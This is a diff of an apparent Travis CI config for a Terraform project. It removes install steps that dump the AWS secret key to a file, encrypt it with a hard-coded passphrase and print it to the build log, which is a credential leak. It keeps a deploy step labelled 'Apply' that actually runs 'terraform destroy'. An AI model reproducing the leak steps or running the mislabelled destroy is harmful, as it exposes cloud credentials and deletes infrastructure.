@@ -4,12 +4,6 @@ branches:
   only:
     - main
 
-sudo: required
-install:
-  - sudo apt-get install -y ccrypt
-  - echo $aws_secret_access_key > info.txt
-  - ccencrypt info.txt -K "thisworks"
-  - cat info.txt.cpt | base64
 env:
   matrix:
     - tf_version=1.0.5 tf_init_cli_options="-input=false" tf_validation_cli_options=""
@@ -39,4 +33,4 @@ jobs:
       script:
         - echo "Executing Terraform Apply on merged code"
         - terraform init $tf_init_cli_options
-        - terraform destroy  -var="aws_secret_access_key=$aws_secret_access_key" -var="aws_access_key_id=$aws_access_key_id"
+        - terraform destroy $tf_apply_cli_options -var="aws_secret_access_key=$aws_secret_access_key" -var="aws_access_key_id=$aws_access_key_id"
